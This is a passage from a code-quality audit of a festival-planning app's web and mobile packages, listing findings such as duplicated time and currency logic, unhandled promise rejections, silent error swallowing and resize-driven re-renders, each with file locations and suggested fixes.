The time-bounds computation in useTimelineFilters.ts lines 69-88 — "let minMin = 24 * 60; ... if (end <= start) end += 24 * 60; ... minMin = Math.floor(minMin / SLOT_MINUTES) * SLOT_MINUTES; maxMin = Math.ceil(maxMin / SLOT_MINUTES) * SLOT_MINUTES" — plus the timedSets/timelessSets split and locale-aware TBA sort (lines 49-63) is duplicated verbatim in packages/mobile/app/(tabs)/index.tsx lines 247-278, whose comment even states it is "mirroring the web useTimelineFilters logic". The midnight-wrap (`end += 24 * 60`) and 15-minute slot rounding are subtle, bug-prone time math that should have one tested home in shared (festivalTime.ts already exists for exactly this category).

**Suggested fix:** Add computeTimeBounds(sets, slotMinutes) and splitTimedSets(sets, b2bSeparator) to @festie/shared/utils/festivalTime.ts with tests; consume from both useTimelineFilters and the mobile tabs screen.

### [MEDIUM] Local MeetingPoint interface duplicates shared CrewMeetingPoint and forces an unsafe double-cast in CrewMap

- **File:** `packages/web/src/components/crew/MeetingPointsTab.tsx:40`
- **Dimension:** unsafe type assertions / duplicated types · **Effort:** small

MeetingPointsTab.tsx lines 40-55 redeclare `interface MeetingPoint { id; crew_id; created_by; label; location; type: TypeKey; meet_at; stage_reference; latitude?; longitude?; active; created_at }` — field-for-field identical to the existing `CrewMeetingPoint` in packages/shared/src/types/domain.ts:263 (which only adds `_optimistic?`). Because the local type is structurally narrower-but-different, CrewMap.tsx line 147 has to launder it through a double assertion: `extractMeetingPointPins(meetingPoints as unknown as CrewMeetingPoint[])`. That cast disables the compiler on the exact boundary the shared util validates, so a field rename in the shared type would compile but break the map pins at runtime.

**Suggested fix:** Delete the local MeetingPoint interface, type the query as CrewMeetingPoint[] (optionally `& { type: TypeKey }`), and remove the `as unknown as` cast in CrewMap.tsx:147 — extractMeetingPointPins then type-checks naturally.

### [MEDIUM] Web crew Expenses/Polls/MeetingPoints tabs bypass the shared crewStore actions that mobile uses

- **File:** `packages/web/src/components/crew/ExpensesTab.tsx:114`
- **Dimension:** web-mobile-parity · **Effort:** medium

Shared crewStore implements the full expense/poll/meeting-point flows (loadExpenses, addExpense with offline placeholder — crewStore.ts:1212 'Offline: placeholder inserted; balances reconcile on the next online sync', settleExpense, createPoll, votePoll, loadMeetingPoints...), and mobile consumes them (CrewExpenses.tsx, CrewPolls.tsx:52-54 `const createPoll = useCrewStore((s) => s.createPoll)`). Web instead re-fetches and mutates via raw api + TanStack Query: ExpensesTab.tsx:94 `api.get(`/crews/${crewId}/expenses`)`, :114-121 `addExpense = useMutation({ mutationFn: (...) => api.post(`/crews/${crewId}/expenses`, payload) })`; PollsTab.tsx:77-89 and MeetingPointsTab.tsx:125-146 do the same. ExpensesTab is even internally mixed — line 71 takes `settleExpense` from the store while add/remove go through raw mutations. Consequences: mobile gets crewStore's optimistic offline placeholders and store-driven realtime patches; web only gets cache invalidation, so optimistic/offline UX and any future business-rule change in crewStore diverge per platform. Packing shows the intended pattern (both platforms use crewStore: PackingTab.tsx:28-32, CrewPacking.tsx:25-28).

**Suggested fix:** Migrate web's ExpensesTab, PollsTab and MeetingPointsTab to the shared crewStore actions (as PackingTab already does), keeping TanStack Query only for read caching if needed, or formally extract the fetch/mutate flows into shared service functions both platforms call. At minimum unify ExpensesTab so add/remove/settle all go through crewStore.

### [MEDIUM] Now/Next selector duplicated between web festival-mode route and mobile useNowNext, with a sort divergence

- **File:** `packages/web/src/routes/festival-mode.tsx:63`
- **Dimension:** web-mobile-parity · **Effort:** small

The 'what's playing now vs up next from my picks' selector exists twice: inline in web routes/festival-mode.tsx:63-85 (`const { current, upcoming } = useMemo(() => { ... timed.push({ set: s, start: bounds.startMs, ... }) ... })`) and in packages/mobile/hooks/useNowNext.ts:39-80 — near-identical logic (picks filter, getSetTimeBounds, split by nowMs, slice upcoming). They have already diverged: mobile sorts current sets `current: timed.filter(...).sort((a, b) => a.end - b.end)` (useNowNext.ts:74) while web leaves `currentSets = timed.filter((t) => t.start <= nowMs && t.end > nowMs)` unsorted (festival-mode.tsx:78), so with overlapping live sets the NOW list orders differently per platform. Mobile's docblock even claims the hook exists 'so the two surfaces can never drift' — but the web surface is a third copy.

**Suggested fix:** Move the selector into @festie/shared (e.g. a pure `selectNowNext(sets, days, picks, nowMs, limit)` util or a shared useNowNext hook parameterized on the store), adopt the end-time sort for current on both platforms, and have web festival-mode + mobile useNowNext consume it.

### [MEDIUM] timeAgo reimplemented locally on both platforms with divergent edge-case handling, bypassing the shared util

- **File:** `packages/web/src/components/crew/ActivityTab.tsx:42`
- **Dimension:** web-mobile-parity · **Effort:** small

Shared `timeAgo(ms)` (packages/shared/src/utils/timeAgo.ts) is documented as the 'single source of truth' for relative-time labels, yet the crew activity feed defines local copies on both platforms: web ActivityTab.tsx:42 `function timeAgo(iso: string) { const s = Math.floor((now - then) / 1000); if (s < 60) return `${s}s ago`; ... }` and mobile CrewActivity.tsx:34. They have already drifted: mobile guards `if (Number.isNaN(then)) return '';` and clamps `${Math.max(s, 0)}s ago`, while web has neither — a bad/clock-skewed `created_at` renders 'NaNs ago' or '-5s ago' on web but not mobile. Web's admin components add two more copies (analyticsTypes.ts:124, AdminDashboard.tsx:91).

**Suggested fix:** Add an ISO-string-accepting variant (or overload) to shared timeAgo with the NaN/negative guards, and replace the local copies in ActivityTab.tsx, CrewActivity.tsx (and ideally the admin duplicates) with imports from @festie/shared/utils.

### [MEDIUM] Timeline pick save: rejecting async handler passed as void callback — unhandled rejection, no user feedback

- **File:** `packages/web/src/routes/timeline.tsx:118`
- **Dimension:** silent-failures · **Effort:** trivial

`const handleSavePick = useCallback(async (setId, priority) => { if (currentFestival) { await savePick(currentFestival.id, setId, priority as Priority | null); } }, ...)` rethrows savePick failures, but it is passed into props typed `onSavePick: (setId: string, priority: string | null) => void` (features/TimelineGrid.tsx:107, components/timeline/TBASection.tsx:16) and invoked fire-and-forget from click handlers (TBASection.tsx:148: `onSavePick(s.id, active ? null : p);`). On failure this produces an unhandled promise rejection and — combined with the never-rendered store error above — zero feedback while the star silently reverts.

**Suggested fix:** Catch in handleSavePick itself: `try { await savePick(...) } catch (e) { toast("Couldn't save pick. Try again.", 'error') }` so every timeline/TBA call site is covered at once.

### [MEDIUM] Conflict-switch / clash-clear fire two floating savePick calls — unhandled rejections and a rollback race that can desync UI from server

- **File:** `packages/web/src/components/features/DetailPanel.tsx:197`
- **Dimension:** silent-failures · **Effort:** small

handleConflictSwitch calls `savePick(currentFestival.id, fromSetId, null); savePick(currentFestival.id, toSet.id, priority);` and handleClashClear calls `savePick(currentFestival.id, setId, null);` (line 209) — no await, no .catch, on a function that rethrows. Beyond the unhandled rejection, the two parallel calls race on rollback: call #2 PUTs the full picks map including call #1's optimistic change, so if call #1's PUT fails and rolls `currentProfile` back to its captured `prev` (festivalDataStore.ts:321) while call #2 succeeds, the server holds BOTH changes but the UI shows NEITHER until the next refetch. The mobile twin has the same pattern (packages/mobile/app/set/[setId].tsx:294-295).

**Suggested fix:** Make the handler async and sequence the two writes (`await savePick(..., null); await savePick(..., priority);`) inside one try/catch that toasts on failure; apply the same to handleClashClear and the mobile handleConflictSwitch.

### [MEDIUM] Festival switcher: empty catch leaves the user with no feedback and the store with a mismatched currentFestivalId

- **File:** `packages/web/src/components/layout/SubHeader.tsx:65`
- **Dimension:** silent-failures · **Effort:** small

`try { await selectFestival(id); } catch (_) {} // eslint-disable-line no-empty`. When a user with bad signal picks a different festival from the dropdown, selectFestival fails after having already done `set({ isLoading: true, error: null, currentFestivalId: festivalId })` (packages/shared/src/stores/festivalDataStore.ts:157), so the persisted `currentFestivalId` now points at the festival that failed to load while `currentFestival`/`sets` still hold the old one. The user sees nothing happen (no toast — festival store error is never rendered on web), and the inconsistent persisted ID survives reloads.

**Suggested fix:** Toast the failure in SubHeader's catch, and in festivalDataStore.selectFestival roll `currentFestivalId` back to its previous value in the catch block so a failed switch leaves consistent state.

### [LOW] import.meta.env access is untyped (no ImportMetaEnv augmentation) and VITE_/EXPO_PUBLIC_ vars are consumed without validation

- **File:** `packages/web/vite-env.d.ts:1`
- **Dimension:** env · **Effort:** small

vite-env.d.ts contains only `/// <reference types="vite/client" />` and the PWA reference — no `interface ImportMetaEnv` augmentation. Every custom var (`VITE_SENTRY_DSN`, `VITE_APP_VERSION`, `VITE_SENTRY_TRACES_RATE`, `VITE_CREW_REALTIME`, `VITE_LIVE_LOCATION`, `VITE_VAPID_PUBLIC_KEY`) therefore types as `any`, so typos like `import.meta.env.VITE_LIVE_LOCATON` typecheck silently. Additionally both apps coerce a rate without validation: `tracesSampleRate: Number(import.meta.env.VITE_SENTRY_TRACES_RATE ?? 0.05)` (packages/web/src/main.tsx line 25) and `Number(process.env.EXPO_PUBLIC_SENTRY_TRACES_RATE ?? 0.05)` (packages/mobile/app/_layout.tsx line 47) — a malformed value yields NaN (Sentry rejects it) and an empty string yields 0 (silently disables tracing).

**Suggested fix:** Augment ImportMetaEnv in vite-env.d.ts with the six known VITE_ keys (readonly string | undefined), and wrap the rate parsing in a small helper that falls back to 0.05 when `Number.isNaN(n) || n < 0 || n > 1`.

### [LOW] Festival-selection failure silently swallowed with a no-empty eslint-disable

- **File:** `packages/web/src/components/layout/SubHeader.tsx:65`
- **Dimension:** eslint-disable · **Effort:** trivial

handleFestivalChange does `try { await selectFestival(id); } catch (_) {} // eslint-disable-line no-empty`. If selectFestival rejects (network down, festival deleted), the user picks a festival from the dropdown and nothing happens — no toast, no console.error, no Sentry breadcrumb. The disable comment carries no justification, unlike the project's documented-disable convention (`-- intentional: ...`) used elsewhere (e.g. useFestivalLoader.ts line 53), and it hides a genuine UX/observability gap rather than a false positive.

**Suggested fix:** Surface the failure: `catch (err) { toast.error('Could not switch festival'); console.error(err); }` (the toast helper is already used in this layout layer), and drop the eslint-disable.

### [LOW] Bare react-hooks/exhaustive-deps disables without justification in CrewMap and shared realtime hooks

- **File:** `packages/web/src/components/crew/CrewMap.tsx:165`
- **Dimension:** eslint-disable · **Effort:** small

CrewMap.tsx carries five bare `// eslint-disable-next-line react-hooks/exhaustive-deps` comments (lines 165, 257, 306, 346, 366) with no stated reason, and the same pattern appears in shared hooks consumed by both apps: packages/shared/src/hooks/useCrewRealtime.ts line 238 and packages/shared/src/hooks/useLiveLocationPublisher.ts line 140, plus packages/mobile/components/MeetingPointCompass.tsx lines 115/151. The repo's own convention elsewhere annotates every such disable with a rationale (e.g. useFestivalLoader.ts line 53: `-- intentional: use user.id to avoid re-fetching...`). Unjustified deps-array suppressions are exactly where stale-closure bugs hide in realtime map/location code, and a reviewer cannot distinguish 'intentional' from 'silenced warning'.

**Suggested fix:** Add a `-- intentional: <reason>` suffix to each disable explaining which dep is deliberately omitted and why it is safe, or restructure (useRef for the map instance, useEffectEvent-style callbacks) so the deps array can be honest and the disable removed.

### [LOW] useGridExport leaves `exporting` stuck true when grid sub-elements are missing

- **File:** `packages/web/src/components/grid/useGridExport.ts:25`
- **Dimension:** broken edge cases in conditional rendering · **Effort:** trivial

`setExporting(true)` is called at line 13, then `if (!body || !cols || !head) return;` exits before the try/finally that resets it. If any of the `[data-grid-body]`/`[data-grid-cols]`/`[data-grid-head]` selectors miss, `exporting` stays true forever, and the guard `if (!gridRef.current || exporting) return;` permanently disables the Export button for the rest of the session.

**Suggested fix:** Move the element lookups and the `if (!body || !cols || !head)` guard above `setExporting(true)` (or `setExporting(false)` before the early return).

### [LOW] Retrying a failed socket mutation enqueues an unprocessable 'api' entry that lingers silently

- **File:** `packages/web/src/components/features/PendingSyncSheet.tsx:16`
- **Dimension:** race conditions in async handlers · **Effort:** small

`retryItem` always re-enqueues as `q.queueMutation({ type: 'api', url: item.url, method: item.method, … })`. For a socket-type failure, useOfflineQueue's surfacing code stored `method: entry.method ?? entry.event` and `url: entry.url ?? ''` (useOfflineQueue.ts:159-160), so the retry creates `{type:'api', url:''}`. In processQueue, `if (mutation.type === 'api' && mutation.url)` (useOfflineQueue.ts:398) is false for an empty url and the socket branch doesn't match either, so the entry is neither executed, nor removed, nor surfaced as failed — it sits as 'pending' inflating pendingCount until the 24h stale sweep, violating the "no silent drops" contract the sheet exists to uphold. Meanwhile the item was optimistically dismissed from the failed list.

**Suggested fix:** Preserve the original mutation type on FailedSyncItem (and event/data for socket mutations) and re-enqueue with the same type; additionally make processQueue treat an entry matching neither branch as a permanent failure (surface + remove) instead of skipping it.

### [LOW] Day-swipe direction is inverted relative to its own comments and platform convention

- **File:** `packages/web/src/hooks/useSwipeDays.ts:44`
- **Dimension:** broken edge cases in conditional rendering · **Effort:** trivial

In @use-gesture, `swipe: [swipeX]` is +1 for a rightward swipe and -1 for a leftward swipe. The handler does `// Swipe left (swipeX > 0) → next day / if (swipeX > 0 && selectedDay < days.length - 1) { newDay = selectedDay + 1; }` — i.e. a swipe to the RIGHT advances to the next day and a swipe LEFT goes back. That contradicts both the inline comments and the standard carousel convention (swipe left = move content forward to the next day), so the SubHeader day swipe moves opposite to the gesture users expect.

**Suggested fix:** Invert the mapping: `swipeX < 0` (leftward) → selectedDay + 1, `swipeX > 0` (rightward) → selectedDay - 1, and fix the comments.

### [LOW] Same query key ['polls', crewId] cached with two different queryFn shapes

- **File:** `packages/web/src/routes/crew.tsx:86`
- **Dimension:** TanStack Query misuse · **Effort:** small

crew.tsx's badge query uses `queryKey: ['polls', activeCrewId]` with a queryFn that returns the raw poll list, while PollsTab.tsx:65-75 uses the SAME key with a queryFn that additionally sanitizes votes: `votes: (p.votes || []).filter((v) => v && v.user_id && typeof v.option === 'number')`. Whichever component fetches first determines the cached shape, so PollsTab can render unsanitized vote arrays (entries with null user_id / non-numeric option — exactly what its filter exists to guard against) whenever the crew route's badge query populated the cache first, which is the normal mount order.

**Suggested fix:** Use one shared queryFn (and types) for the ['polls', crewId] key — e.g. export a fetchPolls helper that applies the vote sanitation, and have crew.tsx reuse it (its `select` already derives the open-count).

### [LOW] Settle-up settlement-plan query is excluded from the offline persist whitelist

- **File:** `packages/web/src/lib/queryPersist.ts:39`
- **Dimension:** TanStack Query misuse · **Effort:** trivial

PERSISTED_KEY_ROOTS contains `'expenses'` and `'expense-balances'` with the comment "['expense-balances', crewId] — ExpensesTab + crew.tsx unsettled badge", but ExpensesTab no longer reads expense-balances — its settle-up card reads `['settlement-plan', crewId]` (ExpensesTab.tsx:104), which is NOT whitelisted. After an offline reload (the module's stated purpose: "standing in a field at a festival"), the expense list restores but the entire settle-up card (myPayments/myReceipts/balances) renders empty because `plan` is undefined.

**Suggested fix:** Add 'settlement-plan' to PERSISTED_KEY_ROOTS and update the stale comment mapping.

### [LOW] Un-throttled resize listener stores raw innerHeight/innerWidth — mobile URL-bar collapse re-renders the entire timeline grid mid-scroll

- **File:** `packages/web/src/hooks/useTimelineViewport.ts:16`
- **Dimension:** performance · **Effort:** small

`const onResize = () => { setVpH(window.innerHeight); setVpW(window.innerWidth); }; window.addEventListener('resize', onResize);` runs un-debounced and stores raw pixel values. On mobile Safari/Chrome, `innerHeight` changes whenever the browser toolbar collapses/expands during scrolling, which fires `resize` — so scrolling the timeline triggers setState storms in `TimelineViewInner`, and when the derived `rowHeight` (`Math.floor(avail / slots)`) shifts by a pixel, `gridTemplateRows` in TimelineGrid changes and every memoized `TimelineGridCell` re-renders + the browser re-lays-out the whole hundreds-of-cells grid while the user is mid-scroll. Desktop window drag-resize produces a render per event for the same reason.

**Suggested fix:** Throttle with requestAnimationFrame (or ~150ms debounce), and quantize what's stored to what the layout actually consumes: keep `vpW` only as the `<=430` breakpoint boolean and compute/`setRowHeight` directly in the handler, bailing when the computed rowHeight is unchanged. Consider `visualViewport`-independent units (the 36px desktop path needs no listener at all when vpW > 430).

### [LOW] Grid route resize handler re-renders all stage columns on every resize event

- **File:** `packages/web/src/routes/grid.tsx:42`
- **Dimension:** performance · **Effort:** small

`const onResize = () => setVw(window.innerWidth); window.addEventListener('resize', onResize);` (lines 41-45) updates state on every raw resize event with the exact pixel width. `PX_PER_MIN = getPxPerMin(vw)` and `GUTTER_W = getGutterW(vw)` derive from it, and `PX_PER_MIN` feeds the `hours`/`nowPx` memos and every `GridStageColumn` (memoized, but the `pxPerMin` prop changes), so a desktop window drag or mobile toolbar-driven viewport change re-renders and re-lays-out every column/set block per event rather than per final size.

**Suggested fix:** Same treatment as useTimelineViewport: rAF-throttle the handler and store only the values the layout consumes (the discrete outputs of `getPxPerMin`/`getGutterW`), bailing out of setState when those bucketed values are unchanged so intermediate resize events cause zero renders.

### [LOW] Off-screen 1080x1920 WrapPoster is permanently mounted on /wrap even if the user never shares

- **File:** `packages/web/src/routes/wrap.tsx:366`
- **Dimension:** performance · **Effort:** small

The export poster is rendered unconditionally whenever the user has rated sets: `{stats.totalRated > 0 && (<div aria-hidden="true" className="fixed -left-[99999px] top-0 w-[1080px] h-[1920px] ..."><div ref={posterRef}><WrapPoster .../></div></div>)}`. A fixed-position 1080x1920 subtree is fully laid out and kept in the render tree for the whole /wrap visit (and the crew tab repeats the pattern with `CrewWrapPoster`), paying layout/memory cost on every page render for an element only needed during the brief `handleShare` capture. On low-end phones this roughly doubles the page's DOM/layout footprint.

**Suggested fix:** Mount the poster only during capture: add a `capturing` state set in `handleShare`, render the off-screen poster when `capturing` is true, await `document.fonts.ready` + a rAF (already done), run `toBlob`, then unmount. Alternatively render it into a detached container created inside `handleShare`.

### [LOW] Four hand-rolled relative-time formatters in web while shared timeAgo/formatStaleness exist

- **File:** `packages/web/src/components/crew/ActivityTab.tsx:42`
- **Dimension:** logic duplicated between web and shared · **Effort:** small

Shared already exports `timeAgo` (packages/shared/src/utils/timeAgo.ts:12, used by FreshnessChip with a "single source" comment), yet web contains four independent reimplementations: ActivityTab.tsx:42 `function timeAgo(iso: string)` ("if (s < 60) return `${s}s ago`..."), AdminDashboard.tsx:91 `const formatTimeAgo = (dateStr: string)`, AdminAudit.tsx:83 an identical copy of that arrow function, and admin/analyticsTypes.ts:124 `export function timeAgo(s: string)`. The AdminDashboard and AdminAudit copies are character-identical to each other. Each formats buckets slightly differently ('just now' vs '0s ago'), so the same timestamp renders inconsistently across screens.

**Suggested fix:** Replace all four with the shared `timeAgo` from @festie/shared/utils (adjusting its signature to accept an ISO string if needed, in one place), deleting the local copies.

### [LOW] Crew activity TYPE_LABELS map and row type duplicated between web ActivityTab and mobile CrewActivity

- **File:** `packages/web/src/components/crew/ActivityTab.tsx:27`
- **Dimension:** logic duplicated between web and shared · **Effort:** trivial

The activity-event vocabulary `const TYPE_LABELS: Record<string, string> = { 'member-joined': 'joined the crew', 'member-left': 'left the crew', ... 'crew-updated': 'updated the crew' }` (ActivityTab.tsx lines 27-40) and the `interface ActivityItem` server-row shape (lines 13-21) are duplicated verbatim in packages/mobile/components/CrewActivity.tsx lines 11-24. When the backend adds a new crew_activity `type`, both maps must be updated or web and mobile show different copy (the `.replace(/-/g, ' ')` fallback masks the drift silently).

**Suggested fix:** Move TYPE_LABELS and the ActivityItem type into @festie/shared (utils + types) and import in both components.

### [LOW] Wrap API response types redeclared in web instead of living in shared types

- **File:** `packages/web/src/routes/wrap.tsx:24`
- **Dimension:** duplicated API contract types · **Effort:** trivial

routes/wrap.tsx lines 24-45 declare `interface WrapStats { totalRated; stagesVisited; daysAttended; totalHours; avgRating? }`, `interface TopSet {...}` and `interface WrapResponse { stats; topSets; allRatings }` for GET /ratings/wrap/:festivalId; packages/mobile/app/wrap.tsx lines 19-38 declare its own WrapStats/WrapSet/WrapResponse for the same endpoint (mobile's comment: "mirror of the web /wrap route"). Two clients now independently describe one API contract — a backend field change can be fixed in one app and silently break the other (the fields are optional-heavy so TS won't catch the drift).

**Suggested fix:** Define WrapStats/WrapSet/WrapResponse once in @festie/shared/types (next to the other server-shape types in domain.ts) and import in both wrap screens.

### [LOW] Expense category metadata and balance formatting duplicated between ExpensesTab and mobile CrewExpenses

- **File:** `packages/web/src/components/crew/ExpensesTab.tsx:47`
- **Dimension:** logic duplicated between web and shared · **Effort:** trivial

ExpensesTab.tsx line 47 `const CATEGORIES = [...]` plus `function formatBalance(value: number)` (line 56) and the categoryFor fallback `CATEGORIES.find((c) => c.key === e.category) ?? CATEGORIES[CATEGORIES.length - 1]!` (line 516) are duplicated in packages/mobile/components/CrewExpenses.tsx (CATEGORIES line 17, formatBalance line 26, categoryFor line 32). Money formatting is exactly the kind of parity-sensitive logic the shared rule covers — a sign/rounding fix in one app's formatBalance would leave the other showing a different balance string for the same data.

**Suggested fix:** Move CATEGORIES (the server-enum metadata), formatBalance, and categoryFor into @festie/shared/utils (e.g. expenses.ts) and import in both tabs.

### [LOW] initialsFor reimplemented in CrewMap (and 3 mobile files) alongside shared getInitials

- **File:** `packages/web/src/components/crew/CrewMap.tsx:123`
- **Dimension:** logic duplicated between web and shared · **Effort:** small

CrewMap.tsx lines 123-128 define `function initialsFor(name: string | undefined)` ("if (parts.length === 1) return parts[0]!.slice(0, 2).toUpperCase(); return (parts[0]![0]! + parts[parts.length - 1]![0]!).toUpperCase()") while @festie/shared/utils/colors.ts:37 already exports a cached `getInitials(name)`. The same private initialsFor is also copy-pasted in mobile/app/(tabs)/crew.tsx:45, mobile/components/CrewActivity.tsx:26 and mobile/components/OfflineMap.tsx:34 — five implementations with two different semantics (first+last word vs first-two-chars), so the same user can show different initials on the map vs the avatar.

**Suggested fix:** Pick one semantic, extend shared getInitials to accept undefined/empty (returning '?'), and replace the four local copies with the shared import.

### [LOW] SetCard is a 585-line component mixing pick mutation, audio-preview lifecycle, crew-overlap join, and a hand-written memo comparator

- **File:** `packages/web/src/components/features/SetCard.tsx:82`
- **Dimension:** component doing too much · **Effort:** medium

SetCard (line 82) owns at least four separable concerns in one file: optimistic pick saving with haptics (`handlePriorityChange`, lines 163-179), a raw HTMLAudioElement preview player with manual listener bookkeeping (`audioRef`/`audioListenersRef` cleanup effect, lines 106-125, and `handlePreviewClick` fetching /spotify/preview, lines 181+), the crew-overlap avatar join (lines 141-161), and a custom React.memo equality function that manually walks conflicts (`if (prevConflicts[i]!.id !== nextConflicts[i]!.id) return false;`, line 579). Every change to any one concern risks the others — the memo comparator in particular must be hand-updated whenever a prop is added, or stale cards render silently (the classic custom-areEqual trap).

**Suggested fix:** Extract a useAudioPreview(setId) hook (owns the audio element, listeners, loading/error state) and a <CrewOverlapCluster> subcomponent fed by the shared groupFriendOverlap helper (see related finding); that shrinks SetCard enough that the custom memo comparator can likely be replaced with default shallow memo on stable props.

### [LOW] Unused queryClient in useRealtimeSync (dead variable kept alive by the effect deps array)

- **File:** `packages/web/src/hooks/useRealtimeSync.ts:63`
- **Dimension:** dead code · **Effort:** trivial

`const queryClient = useQueryClient();` (line 63) is never used anywhere in the hook body — its only other occurrence is the effect dependency array `}, [socket, currentFestivalId, queryClient, setConnected, setOnlineUsers]);` (line 267). It is leftover from before the query-invalidation path moved into useCrewQuerySink, and keeping it in the deps array means the (large) listener-registration effect would needlessly re-run if the QueryClient identity ever changed.

**Suggested fix:** Delete the useQueryClient() call, its import usage, and remove queryClient from the dependency array on line 267.

### [LOW] Crew status emoji/label metadata duplicated between web CrewStatus and mobile CrewStatus

- **File:** `packages/web/src/components/crew/CrewStatus.tsx:26`
- **Dimension:** logic duplicated between web and shared · **Effort:** trivial

Web defines `const STATUS_META: Record<string, { emoji: string; label: string }> = { 'on-my-way': { emoji: '🚶', label: 'On my way' }, here: {...}, delayed: {...} }` (CrewStatus.tsx lines 26-30) and indexes it with non-null assertions (`STATUS_META[key]!.emoji`, line 218); packages/mobile/components/CrewStatus.tsx keeps the same enum metadata in its own `STATUS_OPTIONS` array (line 17). The status enum values come from the shared CrewMemberStatus type, but their user-facing labels/emoji live in two per-app copies, so renaming "Running late" or adding a status requires touching both and they can drift.

**Suggested fix:** Export a single STATUS_META (key, label, emoji) constant from @festie/shared next to the CrewMemberStatus type; derive both web's record and mobile's options array from it, eliminating the `STATUS_META[key]!` assertions by iterating the shared list.

### [LOW] forwardRef still used in ui/Card and ui/IconButton after the React 19 upgrade

- **File:** `packages/web/src/components/ui/Card.tsx:33`
- **Dimension:** deprecated React patterns (pre-upgrade leftovers) · **Effort:** small

Card.tsx uses `const CardRoot = forwardRef<HTMLDivElement, CardProps>(` (line 33) plus three more forwardRef wrappers for Header/Body/Footer (lines 48, 57, 62), and IconButton.tsx line 21 uses `React.forwardRef<HTMLButtonElement, IconButtonProps>`. On React 19.2 (this repo's version) `ref` is a regular prop for function components and forwardRef is officially deprecated, slated for removal — these are the only leftovers in web/src and are pure pre-upgrade patterns.

**Suggested fix:** Convert the five wrappers to plain function components accepting `ref` in props (e.g. `function CardRoot({ ref, className, ...props }: CardProps & { ref?: React.Ref<HTMLDivElement> })`), removing the forwardRef imports.

### [LOW] Currency/balance formatting duplicated in four+ places across web and mobile instead of shared format.ts

- **File:** `packages/web/src/components/crew/ExpensesTab.tsx:56`
- **Dimension:** web-mobile-parity · **Effort:** trivial

Identical money formatters are copy-pasted per platform: `function formatBalance(value: number) { if (value > 0.01) return `+$${value.toFixed(2)}`; ... }` exists verbatim in web ExpensesTab.tsx:56 and mobile CrewExpenses.tsx:26; a USD formatter `n.toLocaleString(undefined, { style: 'currency', currency: 'USD', minimumFractionDigits: 0 })` is duplicated in web CrewWrapPoster.tsx:40, mobile CrewWrapPoster.tsx:42, mobile wrap.tsx:388, and web wrap.tsx:514/539 inlines the same. The expense CATEGORIES emoji/label table is also duplicated verbatim in ExpensesTab.tsx and CrewExpenses.tsx (lines ~50-54 / ~20-24). Shared utils/format.ts has no currency helpers, so any change (rounding, currency, locale) must be made in 4+ files and can silently drift.

**Suggested fix:** Add `formatBalance` and `formatUsd` (and the expense CATEGORIES constant) to @festie/shared (utils/format.ts or a constants module) and import them on both platforms.

### [LOW] Crew realtime + live location are env-flag-dark on web but always-on on mobile

- **File:** `packages/web/src/hooks/useRealtimeSync.ts:35`
- **Dimension:** web-mobile-parity · **Effort:** small

Web gates the entire crew sub-feature realtime path and Live Location/SOS behind build-time flags: `const CREW_REALTIME = import.meta.env.VITE_CREW_REALTIME === '1';` (line 35) and `const LIVE_LOCATION = import.meta.env.VITE_LIVE_LOCATION === '1';` (line 43), feeding a null socket to useCrewRealtime when unset; MeetingPointsTab.tsx:22 gates UI the same way. Mobile registers all crew:*/location:*/sos:* listeners unconditionally (useRealtimeSync.ts:384-398). With the flags unset (the documented default, 'ships dark'), a crew's polls/expenses/meeting points live-update on mobile but require manual refresh/poll on web — a user-visible cross-platform behavior split. The gating is clearly deliberate, but there is no matching flag or fallback note on the mobile side, so the platforms cannot be flipped together.

**Suggested fix:** If the dark-launch period is over, remove the flags (or default them on) so web matches mobile; otherwise mirror the same kill-switch on mobile (a shared runtime/config flag rather than web-only env vars) so realtime behavior can be toggled consistently across platforms.

### [LOW] 'Today' day-key derived via toLocaleDateString('en-CA') in both apps instead of the shared safe helper

- **File:** `packages/web/src/components/layout/SubHeader.tsx:90`
- **Dimension:** web-mobile-parity · **Effort:** trivial

Both platforms compute the YYYY-MM-DD 'today' key for the is-today day-pill highlight with the locale-data hack `new Date().toLocaleDateString('en-CA')` (web SubHeader.tsx:90, mobile app/(tabs)/index.tsx:119), while shared code already contains the robust pad-based construction inside `isTodayFestivalDay` (festivalModeStore.ts:82-84 `const today = `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}``). The en-CA trick depends on ICU locale data formatting en-CA dates as YYYY-MM-DD — true today, but Hermes/browser ICU differences make this a fragile duplicate of logic that already exists in shared form.

**Suggested fix:** Export a `todayDateKey()` util from @festie/shared/utils (refactor isTodayFestivalDay to use it) and replace both toLocaleDateString('en-CA') call sites.

### [LOW] Boot festival-load failure renders a misleading 'choose a festival' empty state with no error or retry

- **File:** `packages/web/src/hooks/useFestivalLoader.ts:38`
- **Dimension:** silent-failures · **Effort:** small

The boot loader swallows every failure: `loadFestivals().then(...).catch(() => {});` (lines 38-46) and `selectFestival(fests[0]!.id).catch(() => {})` (line 42). On a first-ever visit with bad signal (nothing persisted yet), festivals stays empty and the main routes render `EmptyState title="No festival loaded" description="Choose a festival from the top menu to see the timeline."` (routes/timeline.tsx:127-134) — but the top menu is also empty, so the instruction is impossible to follow and there is no retry affordance or hint that the network failed. Mobile handles this same case correctly with an error EmptyState plus a 'Try again' action (app/(tabs)/index.tsx:414-419).

**Suggested fix:** In the no-festival branch of the schedule routes, read `useFestivalStore((s) => s.error)` and, when set, render an error EmptyState with a Retry button that re-calls loadFestivals — mirroring mobile index.tsx:414-419.

---

# Mobile (packages/mobile) — 57 findings

### [HIGH] Every mounted SetCardMobile runs its own 60s setInterval (web twin already fixed)

- **File:** `packages/mobile/hooks/useSetStatus.ts:17`
- **Dimension:** performance · **Effort:** small

useSetStatus holds per-instance state and a per-instance timer: `const timer = setInterval(() => setNow(new Date()), 60000);` with `const [now, setNow] = useState(() => new Date())`. SetCardMobile calls `useSetStatus(set)` (components/SetCardMobile.tsx:161) and is rendered by three lists (Cards view in app/(tabs)/index.tsx, picks.tsx, TBASection), so every mounted card owns an unsynchronized 60s timer and re-renders on its own phase of the minute — smearing JS-thread re-renders across the whole minute and defeating the carefully written `areEqual` memo (internal state changes bypass memo entirely). The improvement-audit-2026-06-05 flagged this exact pattern as High on web (rank 3) and web was fixed with a shared `useNow()` clock (packages/web/src/routes/timeline.tsx imports `useNow` from hooks/useSetStatus) — the mobile port still has the pre-fix pattern.

**Suggested fix:** Mirror the web fix: a module-level single interval exposed via `useSyncExternalStore`-based `useNow()` (one timer for the app, ticking on the minute boundary), then `useSetStatus` consumes that shared now. All cards then re-render in one synchronized batch per minute instead of N staggered timers.

### [HIGH] Backend sends SOS pushes to Android channel 'sos' that the app never creates

- **File:** `packages/mobile/hooks/useMobilePush.ts:29`
- **Dimension:** android-fcm-push · **Effort:** trivial

